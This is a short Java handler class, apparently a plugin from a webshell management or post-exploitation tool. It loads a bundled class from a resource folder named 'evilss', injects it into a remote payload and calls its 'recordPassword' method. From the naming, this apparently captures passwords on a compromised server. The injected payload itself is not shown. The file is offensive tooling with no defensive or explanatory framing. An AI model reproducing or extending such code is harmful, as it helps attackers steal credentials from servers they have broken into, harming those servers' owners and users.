/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.theplutin.handler;

import util.functions;
import util.http.ReqParameter;

/**
 *
 * @author Administrator
 */
public class RecordPassword extends HandlerBase{
    public String handler(){
        this.payload.include("RecordPassword", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/RecordPassword.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("aaa", "aaa");
        return encoding.Decoding(payload.evalFunc("RecordPassword", "recordPassword", reqParameter));
    }
    
}
